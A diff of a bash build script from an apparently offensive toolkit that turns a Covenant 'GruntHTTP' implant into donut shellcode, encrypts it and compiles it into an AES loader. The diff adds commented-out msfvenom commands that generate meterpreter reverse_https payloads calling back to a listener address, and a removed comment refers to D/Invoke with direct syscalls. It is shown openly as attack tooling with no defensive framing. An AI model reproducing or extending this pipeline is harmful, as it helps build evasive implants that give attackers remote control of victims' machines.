@@ -1,12 +1,7 @@
 #!/bin/bash
 
-## Version 0.2, using D/Invoke with direct syscalls
-## Use CS shellcode directly without donut 
-
-## lhost and lport are not in use for this script, make sure arch is correct
-
-lhost="10.0.0.189"
-lport="443"
+#lhost="10.0.0.189"
+#lport="443"
 arch="x64"
 c2type="covenant"
 
@@ -18,16 +13,27 @@ echo 'c2type:'$c2type
 mkdir tmp
 mkdir output
 
-### Move the GruntHTTP.bin to folder input and rename to GruntHTTP.bin, then run the autogen script.
-
+#rawscfilename=$lhost'_'$lport'_https.bin'
+#rawscfilename_enc=$rawscfilename'.enc'
 rawscfilename='GruntHTTP.bin'
 rawscfilename_enc=$rawscfilename'.enc'
 raw_cs_filename_compiled='GruntHTTP.exe'
 
+if [ $arch = 'x64' ]
+then
+    #msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o tmp/$rawscfilename
+    donut/donut -a 2 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
+fi
+
+if [ $arch = 'x86' ]
+then
+    #msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o tmp/$rawscfilename
+    donut/donut -a 1 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
+fi
 
 sleep 2
 
-cp aesloader2_template.txt tmp/aesloadermono_covenant.cs
+cp aesloader_template.txt tmp/aesloadermono_covenant.cs
 
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
 
